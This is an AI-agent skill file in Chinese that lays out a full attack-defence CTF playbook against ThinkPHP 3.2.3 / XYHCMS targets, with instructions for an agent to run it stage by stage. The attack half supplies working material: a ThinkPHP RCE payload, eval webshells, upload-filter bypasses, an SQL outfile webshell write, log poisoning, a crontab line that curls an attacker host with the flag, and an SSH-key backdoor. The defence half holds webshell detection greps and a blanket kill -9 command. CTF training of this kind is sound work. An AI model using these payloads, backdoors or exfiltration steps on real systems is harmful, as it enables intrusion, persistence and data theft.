---
name: "awd-competition"
description: "AWD攻防比赛全流程指南：侦察、攻击(ThinkPHP RCE/文件上传/SQL注入/Webshell/权限维持/Flag轮询)、防御(WAF/密码加固/文件监控/后门清理/计划任务)、自动化脚本。当用户参加AWD比赛、需要攻防脚本、修复靶机漏洞、批量打flag时调用。"
---

# AWD 攻防比赛实战指南

本 Skill 总结自一次完整的 AWD 比赛实战（XYHCMS/ThinkPHP 3.2.3/PHP 5.5.9 靶机），涵盖侦察、攻击、防御、自动化全流程。下次比赛直接按阶段执行。

## 何时使用

- 用户提到 AWD、攻防比赛、打 flag、加固靶机
- 需要批量攻击多个队伍靶机
- 需要部署 WAF、修复漏洞、清理后门
- 需要编写攻防自动化脚本

## 总体流程（按顺序执行）

```
1. 环境准备 → 2. 侦察扫描 → 3. 攻击取flag → 4. 自身防御加固 → 5. 自动化持续运行
```

**核心原则**：
- 攻击和防御必须并行，不能只攻不守
- Flag 会随时间变化，需要轮询监控
- SSH 密码**绝不能改**（会导致失联），其他密码全部加固
- 不要轻信首次拿到的 flag，可能被迷惑或已过期，需验证

---

## 阶段 1：环境准备

### 项目目录结构
```
awd-AI/
├── attack/        # 攻击脚本
│   ├── auto_attack.py        # 批量攻击
│   ├── awd_recon.py          # 侦察
│   ├── team{N}_upload.py     # 单队伍专项利用
│   ├── sqli_team{N}.py       # SQL注入专项
│   └── awd_flag_poller.sh    # Flag轮询
├── defense/       # 防御脚本
│   ├── waf.php               # WAF核心
│   ├── waf_installer.py      # WAF部署
│   ├── auto_defense.sh       # 自动防御(扫描+改密)
│   ├── flag_protector.py     # Flag加密
│   └── backdoor_detector.py  # 后门检测
├── tools/         # 辅助工具
├── payloads/      # Payload生成
├── configs/       # 配置
└── logs/          # 日志
```

---

## 阶段 2：侦察扫描

### 2.1 队伍发现（批量）
```python
# 扫描 192-168-1-{1..120}.pvp7574.bugku.cn
import requests
from concurrent.futures import ThreadPoolExecutor

def check(team):
    host = f"192-168-1-{team}.pvp7574.bugku.cn"
    try:
        r = requests.get(f"http://{host}/", timeout=5)
        return team, r.status_code, r.text[:200]
    except:
        return team, 0, ""

with ThreadPoolExecutor(max_workers=30) as ex:
    for team, code, body in ex.map(check, range(1, 121)):
        if code == 200:
            print(f"Team {team}: {code} {body[:80]}")
```

### 2.2 关键侦察点
- **首页源码**：直接暴露 flag 的情况（如 Team 107 首页直接显示 flag）
- **被 hack 标记**：如 "HACKED BY xxx" 说明已被其他队伍拿下
- **CMS 识别**：XYHCMS、ThinkPHP 版本（决定漏洞利用方式）
- **后台入口**：`/xyhai.php`、`/admin.php`、`index.php/Admin`
- **端口扫描**：SSH(2222)、Web(80)、数据库

### 2.3 ThinkPHP 版本探测
```
/index.php?s=/Index/index        # 路由模式
/index.php?m=Home&c=Index&a=index # 兼容模式
```

---

## 阶段 3：攻击

### 3.1 ThinkPHP 3.2.3 RCE（经典，优先尝试）

**Payload 模板**：
```
/index.php?s=/Index/index/name/${@print(file_get_contents('/flag'))}
/index.php?s=/Index/index/name/${@print(md5(1234))}   # 探测
```

**多参数位爆破**（name 被修复时尝试其他）：
```
?s=/{Controller}/{action}/{param}/${@print(file_get_contents('/flag'))}
```
参数位候选：`name`、`id`、`page`、`cat`、`aid`、`nid`、`cid`、`pid`
控制器候选：`Index`、`Show`、`Article`、`News`、`Page`、`List`、`Product`

**Flag 位置候选**：
```
/flag  /flag.txt  /root/flag  /home/*/flag  /tmp/flag
```
注意可能存在软链接，多个路径指向同一 flag。

### 3.2 文件上传漏洞利用（RCE 被修复后的重点）

**步骤 1：找上传入口**
- URL: `index.php?m=Home&c=Upload&a=index`、`index.php/Home/Upload/index`
- 字段名爆破: `file`、`Filedata`、`upfile`、`upload`、`avatar`、`pic`、`img`、`image`、`photo`、`attach`

**步骤 2：扩展名绕过清单**
```python
extensions = [
    "php", "php5", "php4", "php3", "php2", "php7", "php8",
    "phtml", "pht", "phps", "phar",
    "PHP", "Php", "pHp", "pHp5",        # 大小写
    "php ", "php.", "php. .",           # 空格/点号
    "jpg.php", "php.jpg", "php%00.jpg", # 双写/截断
    "php\x00.jpg",                       # 空字节
]
```

**步骤 3：配置文件绕过（关键）**
- **.htaccess**（Apache）:
  ```
  AddType application/x-httpd-php .abc .xyz
  AddHandler application/x-httpd-php .abc
  ```
  上传 `.htaccess` + `shell.abc`（自定义扩展名+PHP内容）
- **.user.ini**（CGI/FastCGI）:
  ```
  auto_prepend_file="shell.jpg"
  ```
  上传 `.user.ini` + `shell.jpg`（PHP内容），访问同目录任意 PHP 触发

**步骤 4：图片马**
```python
shell = b'GIF89a<?php echo "SHELL_OK";@eval($_POST["cmd"]);?>'
```
配合 .htaccess 的 `SetHandler application/x-httpd-php` 让 .jpg 当 PHP 执行。

**步骤 5：路径遍历上传**
```python
traversal_paths = [
    "../../Runtime/Cache/test.php",    # ThinkPHP缓存目录
    "../../Runtime/Logs/test.php",
    "../../Runtime/Temp/test.php",
    "../../Public/test.php",
]
```
配合 POST 参数 `save_path`、`path`、`filepath`、`dir` 指定保存路径。

**步骤 6：竞争条件**
```python
# 并发上传 + 并发访问，在文件被删除前执行
import concurrent.futures
def uploader():
    for i in range(30):
        upload_file(f"rc_{i}.php", shell)
def accessor():
    for i in range(100):
        access(f"upload/rc_{i}.php")
        if "SHELL_OK" in body: return True
```

**步骤 7：Session 上传包含**
利用 `PHP_SESSION_UPLOAD_PROGRESS`，构造大文件延迟请求，在 session 文件写入期间包含 `/tmp/sess_xxx`。

### 3.3 SQL 注入

**注入点探测**：`Show/Article/News/Page/Content` 控制器的 `id` 类参数

**手法优先级**：
1. Union 注入（找显示位 → `load_file('/flag')` 读文件 → `into outfile` 写 webshell）
2. 报错注入（`updatexml`、`extractvalue`）
3. 布尔盲注（`and 1=1` vs `and 1=2` 对比长度）
4. 时间盲注（`sleep(5)`）

**写 Webshell**：
```sql
-1 union select '<?php @eval($_POST[x]);?>' into outfile '/app/upload/s.php'
```

### 3.4 文件包含 / 日志包含

**日志写马**：通过 User-Agent、Referer、X-Forwarded-For 写入 PHP 代码到日志
```python
headers = {"User-Agent": "<?php echo file_get_contents('/flag');?>"}
requests.get(f"{BASE}/index.php", headers=headers)
```

**日志路径**（ThinkPHP 3.2.3）：
```
App/Runtime/Logs/Home/YY_MM_DD.log
Runtime/Logs/Home/YY_MM_DD.log
```

**包含参数爆破**：`template`、`tpl`、`theme`、`view`、`skin`、`file`、`path`、`page`

**模板缓存包含**：上传到 `Runtime/Cache/` 目录的文件会被 include。

### 3.5 后台弱口令

**常用组合**：
```python
creds = [
    ("admin", "admin123"), ("admin", "admin"), ("admin", "123456"),
    ("admin", "admin888"), ("admin", "666666"),
    ("xyhai", "xyhai"), ("xyhai", "admin123"),
    ("root", "root123"),
]
```
注意：其他队伍可能已改强密码，优先尝试默认弱口令。

### 3.6 拿到 Webshell 后：权限维持

```bash
# 1. 写多个隐蔽后门（不同位置、不同形态）
/app/uploads/.config.php      # 隐藏文件
/app/avatar/1.php             # 上传目录
/index.php                    # 入口文件植入（危险，慎用）

# 2. Crontab 反弹/定时任务
*/5 * * * * curl http://attacker/$(cat /flag)  # 定时外带flag

# 3. SSH authorized_keys（如果可写）
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 4. 软链接后门
ln -s /flag /tmp/.cache_flag
```

### 3.7 Flag 轮询（持续监控）

```bash
#!/bin/bash
# awd_flag_poller.sh - 每60秒检查已拿下目标的flag是否变化
TARGETS=(
    "team2:http://192-168-1-2.pvp7574.bugku.cn/index.php?s=/Index/index/name/\${@print(file_get_contents('/flag'))}"
)
while true; do
    for t in "${TARGETS[@]}"; do
        name="${t%%:*}"
        url="${t#*:}"
        flag=$(curl -s "$url" | grep -oP 'flag\{[^}]+\}')
        echo "$(date) $name: $flag"
    done
    sleep 60
done
```

---

## 阶段 4：防御加固

> ⚠️ **开局第一件事（拿到源码后 5 分钟内）**：用 `python3 defense/backdoor_detector.py /app` 排查预埋后门。AWD 出题人通常埋了显性 Webshell、变量覆盖、条件竞争、不死马 4 类后门，详见 [classifications/web.md §11](../../../classifications/web.md#11-awd-专属隐藏后门专题)。发现后先记录再删除（保留证据 + 防止复活）。

### 4.1 WAF 部署（核心）

**WAF 检测 10 大类**：
1. SQL 注入（union/select/insert/update/delete + 注释符）
2. XSS（script/onerror/onload/javascript）
3. 命令执行（system/exec/passthru/shell_exec/反引号）
4. 代码执行（eval/assert/preg_replace /e）
5. 文件包含（../、php://、data://）
6. RCE 模式（`${@...}`，ThinkPHP 特征）
7. 文件上传（恶意扩展名）
8. 目录遍历
9. SSTI/模板注入
10. 序列化攻击

**部署方式**：在入口文件（`index.php`、`xyhai.php`）顶部 `require_once 'waf.php';`

**验证**：
```bash
curl "http://target/?id=1' or 1=1--"      # 应返回 403
curl "http://target/index.php?s=/Index/index/name/\${@print(1)}"  # 应返回 403
```

### 4.2 密码加固（除 SSH 外全部修改）

**强密码格式**：
```
数据库(cms):  Xy#2026Db$ecure!
数据库(root): Rt#2026Root$ec!
后台admin:    Ad#2026Admin$ec!  (配合salt)
Cookie密钥:   Ck#2026$ecretKey!!
邮箱密码:     Em#2026Mail$ec!!
```
要求：16位左右，含大小写+数字+特殊字符。

**注意**：密码含 `$` 在 bash 中会被解析，**用 PHP 脚本改密码**而非 shell 命令。

### 4.3 漏洞修复清单

| 漏洞 | 修复方式 |
|------|----------|
| 源码泄露 | 删除 `.git`、`.DS_Store`、`/Install` 目录 |
| ThinkPHP RCE | WAF 拦截 `${@...}` 模式 |
| 文件上传 | 白名单扩展名（jpg/jpeg/gif/png/bmp/doc/xls/pdf/txt/zip/rar/mp3/mp4 等），禁止 php/phtml/phar/htaccess/user.ini |
| PHP 执行 | `/app/uploads/`、`/app/avatar/` 目录禁用 PHP 执行（Apache 配置 `php_flag engine off`）|
| 后台 getshell | 数据库备份功能加固，禁用危险函数 |
| 配置文件 | `db.php`、`config.php` 权限设为 640 |
| 弱口令 | 全部改强密码 |
| 缓存损坏 | 清理 `Runtime/` 目录，修复 config |

### 4.4 后门清理

```bash
# 1. 扫描 webshell
find /app -name "*.php" | xargs grep -l "eval\|assert\|system\|passthru\|shell_exec"

# 2. 清理 crontab
crontab -l  # 检查异常任务
crontab -r  # 清空（保留必要任务如 autokill）

# 3. 清理 SSH 后门
> ~/.ssh/authorized_keys

# 4. 杀可疑进程
ps aux | grep -v "sshd\|nginx\|php\|mysql" | awk '{print $2}' | xargs kill -9
```

#### 4.4.1 AWD 4 类预埋后门速查（详见 [classifications/web.md §11](../../../classifications/web.md#11-awd-专属隐藏后门专题)）

| 后门类型 | 检测命令 | 清除方法 |
|---------|---------|---------|
| **① 显性 Webshell** | `find /app -name "*.php" \| xargs grep -lE "eval\|assert\|system\|passthru\|shell_exec"` | `rm -f` 删除 + 检查 crontab 是否定时复活 |
| **② 变量覆盖** | `grep -rnE "extract\s*\(\s*\\\$_(GET\|POST\|REQUEST)" /app` | 改成 `extract($_REQUEST, EXTR_SKIP)` 或显式取变量 |
| **③ 条件竞争** | 找 `move_uploaded_file` 与 `unlink` 之间的时序窗口 | 先校验后保存 + 文件名随机化 + 上传目录禁 PHP |
| **④ 不死马（内存马）** | `ps aux \| grep php-fpm` CPU 占用异常 / 文件 mtime 反复变化 | **重启 PHP-FPM** (`service php-fpm restart`) 最有效 / `chattr +i` 锁文件 / 竞争删除脚本 |

#### 4.4.2 SSH 后门 4 种形态（详见 [classifications/web.md §12.2](../../../classifications/web.md#122-ssh-弱口令与后门)）

```bash
# 检测异常监听端口 (非 22/80/443/3306)
ss -tlnp | grep -vE ":22 |:80 |:443 |:3306 "

# 检测 sshd 是否被替换
file /usr/sbin/sshd        # 应该是 ELF, 不是脚本
ls /usr/sbin/sshd.bak /tmp/su /tmp/.sshd 2>/dev/null   # 后门文件

# 清理: 杀异常 sshd 进程 + 恢复 sshd.bak + 清空 authorized_keys
ps -ef | grep -E "/tmp/su|/tmp/.sshd" | grep -v grep | awk '{print $2}' | xargs kill -9
[ -f /usr/sbin/sshd.bak ] && mv /usr/sbin/sshd.bak /usr/sbin/sshd
> ~/.ssh/authorized_keys
```

#### 4.4.3 硬编码敏感信息（详见 [classifications/web.md §13](../../../classifications/web.md#13-硬编码与敏感信息泄露)）

```bash
# 找硬编码密码
grep -rnE "(DB_PWD|DB_PASSWORD|password)\s*['\"]*\s*=>\s*['\"][^'\"]{3,}" /app --include="*.php"
# 找 flag 字符串
grep -rnE "(flag|FLAG)\{[^}]+\}" /app --include="*.php"
# 找 md5 弱哈希 (32 位十六进制)
grep -rnE "[a-f0-9]{32}" /app --include="*.php" | head

# 清理泄露文件
rm -rf /app/.git /app/.svn /app/.DS_Store /app/Install /app/www.zip /app/backup.* /app/.env /app/phpinfo.php
```

### 4.5 文件监控（实时+定时）

```bash
# 文件基线
find /app -type f -name "*.php" | xargs md5sum > /tmp/baseline.txt

# 定时检查（每1分钟）
while true; do
    find /app -type f -name "*.php" -newer /tmp/baseline.txt 2>/dev/null
    md5sum -c /tmp/baseline.txt 2>/dev/null | grep -v "OK"
    sleep 60
done
```

### 4.6 自动化防御脚本

```bash
# auto_defense.sh
GEN_PASS() { cat /dev/urandom | tr -dc 'A-Za-z0-9#@$!%*' | head -c 16; }

# 每1分钟扫描webshell
# 每10分钟改密码（数据库、admin）
# 实时监控文件变化
# 检测到后门自动删除+告警
```

### 4.7 IP 白名单防火墙 + 实时流量监控（核心新增）

> **目的**：比赛最稳的防御不是 WAF 拦 payload，而是**直接封 IP**。默认策略 = deny，除了白名单（你自己的攻击机 + 比赛平台 checker + 本机回环），其余 IP **连 Web 端口都碰不到**。

---

#### 4.7.1 三层拦截架构（一 IP 不过）

| 层 | 位置 | 拦截方式 | 力度 | 脚本 |
|---|------|---------|------|------|
| **L1** | 系统内核 | `iptables DROP` / `REJECT` | 流量直接丢弃，无 HTTP 响应 | [ip_firewall.py](file:///root/Documents/trae_projects/awd-AI/defense/ip_firewall.py) `apply iptables` |
| **L2** | Web 服务器 | Apache `.htaccess` 或 `nginx.conf` 规则 | 返回 403 Forbidden (无 PHP 开销) | `generate htaccess` / `generate nginx` |
| **L3** | 应用入口 | `waf.php` IP 防火墙模块 | 精准 403 + 原因解释页 + 自动写 iptables 立刻拉黑 + 冷却 | [waf.php](file:///root/Documents/trae_projects/awd-AI/defense/waf.php) |

三层联动：WAF 命中 → 自动 `iptables -I INPUT -s $ip DROP` → 该 IP 下一秒所有包在 L1 全部丢掉，不会再浪费你的 CPU。

---

#### 4.7.2 默认策略 = deny（除白名单外全部拦截）

```
决策逻辑:
  if ip in 黑名单            → 立即 BLOCK (L1/L2/L3 任一命中即拦)
  elif ip in 白名单 (or CIDR) → 放行
  else                        → 默认 deny → BLOCK
```

支持的匹配形式：
- 单个 IPv4：`10.0.0.100`、`203.0.113.5`
- CIDR 网段：`192.168.1.0/24` 覆盖整段
- IPv6：`::1`、CIDR 前缀匹配

---

#### 4.7.3 一键初始化白名单

```bash
# 1) 写一个文本文件，每一行: <IP|CIDR> [空格分隔备注]
cat > my_whitelist.txt <<EOF
192.168.1.0/24    我方团队办公/攻击内网
10.0.0.100        我的攻击机A
10.0.0.101        我的攻击机B
203.0.113.5       比赛平台 Checker Server
EOF

# 2) 初始化 + 批量导入
python3 defense/ip_firewall.py init --whitelist my_whitelist.txt

# 3) 生成 3 套规则
python3 defense/ip_firewall.py generate waf      --out /tmp/awd_ipfw/ip_firewall.php   # 给 waf.php 用
python3 defense/ip_firewall.py generate htaccess --out /app/.htaccess                      # Apache 层
sudo python3 defense/ip_firewall.py apply iptables                                           # 系统层 iptables

# 4) 验证：check 不在白名单的 IP 应该 BLOCK
python3 defense/ip_firewall.py check 1.2.3.4   # 期望 BLOCK ❌
python3 defense/ip_firewall.py check 10.0.0.100 # 期望 ALLOW ✅
```

---

#### 4.7.4 实时流量监控（tail + 自动封）

监控 Apache/Nginx 的 access.log，**每条请求**都过一遍 IP 白名单决策，发现非白名单 / 速率超限 → 立刻 iptables 拉黑：

```bash
# 单日志文件 + 前台跑（调试）
bash defense/traffic_monitor.sh start /var/log/apache2/access.log combined

# 多日志 + 后台 daemon（生产）—— 同时盯 Apache + Nginx
bash defense/traffic_monitor.sh daemon \
     "/var/log/apache2/access.log /var/log/nginx/access.log" combined

# 查看状态 + 最近 20 条封禁
bash defense/traffic_monitor.sh status

# 停止
bash defense/traffic_monitor.sh stop
```

**速率阈值（防路径爆破/目录扫描）**：
```bash
# 环境变量调参，默认 10 秒 50 次 → 封
RATE_WINDOW_SEC=5   RATE_MAX_HITS=25  \
BAN_COOLDOWN_SEC=3600 \
bash defense/traffic_monitor.sh daemon "/var/log/apache2/access.log" combined
# 上面：5 秒内单 IP 超 25 次请求 → 封 1 小时
```

日志格式自动探测 (`auto`)，也可显式指定 `combined` / `common` / `nginx` / `simple`。

---

#### 4.7.5 WAF.php 应用层联动（三层 L3）

waf.php 现在第一步就执行 IP 防火墙（**先于所有 payload 特征检测**），这样：
- 你自己攻击机的所有请求 → 直接放行（哪怕带 SQLi/payload，也不会误被自己 WAF 拦）
- 陌生 IP 的请求 → 先 403 + 记 ban.log → 后台 exec iptables 立刻拉黑（冷却 30 分钟内不重复调用）

waf.php 会自动加载 IP 防火墙规则文件（优先级 1>2>3）：
1. `/tmp/awd_ipfw/ip_firewall.php`（由 `ip_firewall.py generate waf` 生成的 PHP 数组，推荐）
2. 环境变量 `AWD_WAF_WHITELIST_IP` / `AWD_WAF_BLACKLIST_IP`（逗号分隔，临时应急）
3. 默认：仅 `127.0.0.1` / `::1` 白名单，其他 deny（兜底保护）

---

#### 4.7.6 常用操作速查

```bash
# ====== 规则增删 ======
python3 /tmp/ip_firewall.py add white <IP/CIDR> "备注"   # 加白
python3 /tmp/ip_firewall.py add black <IP> "备注"        # 加黑
python3 /tmp/ip_firewall.py rm  white <IP/CIDR>          # 移除

# ====== 查看 / 校验 ======
python3 /tmp/ip_firewall.py list                         # 所有 IP + 备注 + 时间
python3 /tmp/ip_firewall.py check <IP>                   # 决策模拟 (ALLOW/BLOCK + 原因)
tail -n 30 /tmp/awd_ipfw/ban.log                         # 最近封禁记录
bash /tmp/traffic_monitor.sh status                      # 监控状态+规则摘要

# ====== 重新生效 ======
python3 /tmp/ip_firewall.py generate waf      --out /tmp/awd_ipfw/ip_firewall.php
python3 /tmp/ip_firewall.py generate htaccess --out /app/.htaccess
sudo bash /tmp/awd_ipfw_rules.sh              # 重设 iptables 链

# ====== 误封应急：临时切黑名单模式，保留 WAF 特征，只拦明确黑名单 ======
# 1. JSON 层
sed -i 's|"default_policy": "deny"|"default_policy": "allow"|' /tmp/awd_ipfw/ip_rules.json
# 2. 重新生成规则 (L2/L3)
python3 /tmp/ip_firewall.py generate waf      --out /tmp/awd_ipfw/ip_firewall.php
python3 /tmp/ip_firewall.py generate htaccess --out /app/.htaccess
# 3. L1 iptables: 删除 AWD_FW 链最后那条 default_deny REJECT 规则
sudo iptables -D AWD_FW -j REJECT --reject-with icmp-host-prohibited -m comment --comment 'awd:default_deny'
# 4. 环境变量应急 (PHP 层立即生效, 无需改文件)
export AWD_WAF_DEFAULT_POLICY=allow
```

---

#### 4.7.7 ⚠️ 致命警告（必须遵守）

> **部署 deny 白名单前，必须先把你所有攻击机 / SSH 管理机的 IP 加入白名单！**
> 否则一开 iptables 或 htaccess，你自己的 SSH/HTTP 全部断，只能重启靶机或找赛题平台恢复。
>
> **推荐顺序**（defense_bootstrap.sh 会自动做）：
> 1. `add white 127.0.0.1` + 本机出口 IP
> 2. `add white <SSH 客户端 IP>`（从 `$SSH_CLIENT` 或 `who am i` 抓）
> 3. 从现有 access.log 找「访问最多且不是你」的 IP → 很可能是比赛平台 checker → 加白
> 4. 生成 L3 (waf.php 数组) → L2 (.htaccess) → L1 (iptables，最后上)
> 5. 先在 WAF 层 (`AWD_WAF_MODE=log`) 跑 1 分钟看日志确认无误杀，再切 `block` + 上 iptables

### 4.8 数据备份与快速恢复（止损底牌，核心新增）

> **场景**：攻击者拿到 webshell 后 `rm -rf /app/*` 或篡改 index.php → 服务 502/500 → 平台 checker 持续扣分。
> **对策**：拿到靶机**第一件事**就做完整备份，crontab 每 5 分钟增量备份，被破坏后 `restore.sh all` 秒级回滚。

---

#### 4.8.1 备份策略（三阶段）

| 阶段 | 时机 | 操作 | 命令 |
|------|------|------|------|
| **① 完整备份** | 拿到 SSH 后 30 秒内 (defense_bootstrap.sh 自动做) | tar 整个 /app + mysqldump 全库 + 配置 + IP规则 + crontab + 进程快照 | `bash /tmp/backup.sh full` |
| **② 增量备份** | crontab 每 5 分钟 | 只打包最近 10 分钟 mtime 变更的文件 + 数据库 | `bash /tmp/backup.sh inc` (已自动加 crontab) |
| **③ 取证备份** | 发现被攻击时 (restore 前) | 自动把当前(被篡改)版本存为 `compromised_*.tar.gz` | `restore.sh all` 时自动触发 |

---

#### 4.8.2 备份内容清单（6 大块）

```
/tmp/awd_backup/20260812_103022_full/
├── web_root.tar.gz          # 1. Web 源码 (排除 Runtime/Cache/Logs/Upload)
├── db_all.sql               # 2. 数据库全库 (mysqldump --single-transaction)
├── db_xyhcms_schema.sql     #    纯结构 (用于对比篡改)
├── etc/                     # 3. 系统配置 (nginx/apache/php/mysql/ssh)
├── awd_ipfw/                # 4. IP 防火墙规则 (ip_rules.json + ban.log)
├── waf.php + htaccess       # 5. WAF 代码 + .htaccess
├── iptables_save.txt        #    iptables 规则快照
├── crontab.txt              # 6. crontab 基线 (对照后门)
├── authorized_keys          #    SSH 公钥基线
├── ps_snapshot.txt          #    进程快照 (查异常进程)
├── listen_ports.txt         #    监听端口快照
├── MANIFEST.txt             #    备份元信息 (时间/主机/大小)
└── sha256.txt               #    全文件 sha256 (恢复前校验完整性)
```

---

#### 4.8.3 常用命令速查

```bash
# === 备份 ===
bash /tmp/backup.sh full                  # 完整备份 (开赛拿到靶机立刻做)
bash /tmp/backup.sh inc                   # 增量备份 (crontab 自动每 5 分钟)
bash /tmp/backup.sh list                  # 列出所有备份 + 大小 + 文件数
bash /tmp/backup.sh latest                # 打印最新备份路径 + manifest
bash /tmp/backup.sh verify [备份目录]     # sha256 校验完整性 (默认 latest)
bash /tmp/backup.sh purge 20              # 只保留最新 20 份 (防磁盘满)

# === 恢复 (按需选) ===
bash /tmp/restore.sh all                  # ⭐ 全量恢复 (推荐, 服务宕机时秒级止损)
bash /tmp/restore.sh all <备份目录>       # 指定备份恢复 (回滚到特定时间点)
bash /tmp/restore.sh web                  # 只恢复 Web 源码
bash /tmp/restore.sh db                   # 只恢复数据库
bash /tmp/restore.sh ipfw                 # 只恢复 IP 防火墙规则
bash /tmp/restore.sh waf                  # 只恢复 waf.php + .htaccess
bash /tmp/restore.sh config               # 只恢复系统配置 (nginx/apache/php)
bash /tmp/restore.sh restart              # 只重启服务 (不恢复数据, 临时卡死用)
bash /tmp/restore.sh health               # 健康检查 (HTTP+进程+端口+WAF+flag)

# === 取证 ===
bash /tmp/restore.sh diff [备份目录]      # 对比当前 vs 备份差异 (查谁改了什么)
                                          # → web 文件差异 + crontab + authorized_keys + 新增进程
```

---

#### 4.8.4 全量恢复流程（restore.sh all 自动执行）

```
1. sha256 完整性校验      → 备份本身没被篡改
2. restore_ipfw          → 先恢复 IP 防火墙 (防止恢复过程中又被攻击)
                          → 清除攻击者塞的恶意 iptables 规则 (非 awd: 前缀的)
3. restore_db            → 先备份当前(被篡改)DB → 再恢复 SQL
4. restore_web           → 先 tar 当前(被篡改)web → rm -rf /app → 解压备份
                          → chown www-data + 640 配置 + 上传目录禁PHP
5. restore_config        → 配置文件 diff 后覆盖 (只覆盖被篡改的)
6. clean_backdoors       → 清 authorized_keys + crontab + 杀可疑进程 + 删 webshell
7. restart_web_stack     → 重启 nginx/apache + php-fpm + mysql
8. do_health             → curl HTTP + WAF 拦截测试 + /flag 检查 + 端口监听
```

整个流程**完全自动化**，无需人工介入，平均 15-30 秒完成（取决于 web 源码大小）。

---

#### 4.8.5 ⚠️ 关键注意事项

> **1. 备份存储位置**：默认 `/tmp/awd_backup/`。如果攻击者拿到 root 把 `/tmp` 也删了，备份就没了。**建议**：
> - 比赛平台允许的话，把备份 scp 到你的攻击机：`scp -r target:/tmp/awd_backup ./`
> - 或者备份到比赛平台提供的持久化目录（看赛题说明）
>
> **2. 不要把备份放在 Web 可访问目录**：`/app/awd_backup.tar.gz` 这种位置等于送源码给攻击者。
>
> **3. 恢复后必做**：
> - 立刻改 DB / admin 密码（攻击者可能已经知道当前密码）
> - 查 `restore.sh diff` 找出攻击者改了什么 → 把攻击者 IP 加黑名单：`python3 /tmp/ip_firewall.py auto-ban <ip> "攻击证据"`
> - 立刻做一份新完整备份：`bash /tmp/backup.sh full`
>
> **4. 备份 ≠ 永远安全**：如果攻击者已经在你的备份里植入了后门（比如开赛前就被打了），恢复回去等于恢复一个带后门的版本。**defense_bootstrap.sh 的 Step 1.5 在改密/清马之前做完整备份**，保证备份是干净的原状。
>
> **5. 增量备份不能替代完整备份**：增量只打包 mtime 最近 10 分钟的文件，恢复时需要先恢复最近的 full 再覆盖 inc。**`restore.sh all` 默认用 latest 软链接，而 latest 总是指向最近的备份（full 或 inc）**，对于关键场景请手动指定一个 full 备份目录。

---

## 阶段 5：自动化与持续运行

### 5.1 攻击自动化
```python
# auto_attack.py - 批量攻击所有存活队伍
def attack_team(host):
    # 1. ThinkPHP RCE
    # 2. shell_exec 检测
    # 3. ThinkPHP 5 RCE
    # 4. 文件上传
    # 5. SQL注入
    # 成功则记录flag并加入轮询列表
```

### 5.2 防御自动化
```bash
# crontab
*/1 * * * * /path/scan_webshell.sh     # 每分钟扫马
*/5 * * * * /path/file_guard.sh        # 每5分钟文件完整性
*/10 * * * * /path/rotate_pass.sh      # 每10分钟改密码
```

---

## 关键约束（硬性，不可违反）

1. **SSH 密码绝不可修改** —— 会导致失联
2. **配置文件权限必须 640**
3. **上传目录禁止 PHP 执行**
4. **WAF 必须拦截 `${@...}` RCE 模式**
5. **Flag 必须验证** —— 可能被迷惑或已过期
6. **Crontab 和 authorized_keys 必须定期检查后门**
7. **可疑进程必须立即终止**
8. **部署 deny 白名单前，必须先把攻击机/SSH 管理机 IP 加入白名单** —— 否则 iptables/htaccess 一上就把自己锁在外，只能重启靶机
9. **IP 白名单必须包含比赛平台 checker 的 IP** —— 否则 checker 连不上你的靶机，平台判你靶机 down，直接扣分（defense_bootstrap.sh 会从 access.log Top IP 自动识别候选并加白，**手动再核对一次**）

---

## 经验教训（实战血泪）

1. **弱密码（admin123）是最大隐患** —— 必须强密码+salt
2. **Flag 可能被伪造** —— Team 26 曾返回过期/伪造 flag，需交叉验证
3. **ThinkPHP RCE 易修复** —— 其他队伍很快打补丁，要快速收割
4. **文件上传是持久战** —— 单一绕过往往失效，需组合（.htaccess+.user.ini+路径遍历+竞争条件）
5. **日志包含要写马** —— 通过 HTTP 头写入 PHP 到日志，再包含执行
6. **目标重启后防护可能丢失** —— WAF 文件被清空，需重新部署
7. **首页模板可能丢失** —— 需准备基础模板应急
8. **攻击要趁早** —— 比赛初期大家防护弱，后期都加固了
9. **并行攻防** —— 不能只攻不守，自家靶机随时被攻击
10. **效率优先** —— 已拿下的目标只做 flag 轮询，精力放在新目标
11. **单靠 WAF 拦 payload 会被绕过** —— 必开 IP 白名单 deny 模式：陌生 IP 在 L1 内核层直接 DROP，L2/L3 兜底，三层联动才是最稳的防御；同时跑 traffic_monitor 实时监控 access.log 打扫描器

---

## 快速决策树

```
新目标?
├─ 探测CMS版本
├─ ThinkPHP?
│   ├─ 3.x → 尝试 ${@} RCE
│   └─ 5.x → 尝试 method RCE
├─ 有上传点?
│   ├─ 找字段名 → 扩展名绕过 → .htaccess/.user.ini → 路径遍历 → 竞争条件
├─ 有SQL注入?
│   ├─ Union → load_file读flag → into outfile写马
├─ 后台可登录?
│   ├─ 弱口令 → 上传/getshell
└─ 全部失败?
    └─ 日志包含 + 模板缓存包含 + Session上传
```

---

## 常用 Payload 速查

### ThinkPHP 3.2.3 RCE
```
/index.php?s=/Index/index/name/${@print(file_get_contents('/flag'))}
```

### 一句话木马（多种形态）
```php
<?php @eval($_POST['cmd']);?>
<?php assert($_POST['cmd']);?>
<?php $_GET['a']($_POST['cmd']);?>
<?php preg_replace("/.*/e",$_POST['cmd'],"");?>
GIF89a<?php @eval($_POST['cmd']);?>    // 图片马
```

### .htaccess
```
AddType application/x-httpd-php .abc
<FilesMatch "\.jpg$">SetHandler application/x-httpd-php</FilesMatch>
```

### .user.ini
```
auto_prepend_file="shell.jpg"
```

### SQL 读文件
```sql
-1 union select 1,load_file('/flag'),3--+
```

### SQL 写马
```sql
-1 union select '<?php @eval($_POST[x]);?>' into outfile '/app/upload/s.php'--+
```

---

## 执行建议

下次比赛开始时，按以下顺序快速启动：

1. **复制本项目结构**到新比赛目录
2. **修改目标域名模板**（`192-168-1-{X}.pvp7574.bugku.cn` → 实际域名）
3. **运行侦察脚本**发现存活队伍
4. **优先打 ThinkPHP RCE**（最快收割首批 flag）
5. **立即加固自家靶机**（WAF + 改密 + 清马）
6. **部署自动化**（攻击轮询 + 防御监控）
7. **持续扫描新漏洞**（文件上传、SQL注入）

记住：**攻击要快，防御要稳，自动化是关键**。

---

## 配套分类手册

详细的攻防技术分类（Web/Pwn/Misc/Crypto/Reverse/Mobile/Blockchain）请查阅：

📂 **`classifications/awd_attack_defense_classification.md`**

包含：
- **Web**：10 大类攻击（SQLi/Upload/Inclusion/RCE/XSS/反序列化/SSRF/SSTI/文件下载/逻辑漏洞）+ 防御措施 + Payload 模板
- **Pwn**：8 类二进制漏洞（栈溢出/格式化字符串/堆利用/UAF/ROP/ret2xxx/整数溢出/Kernel Pwn）+ 工具清单
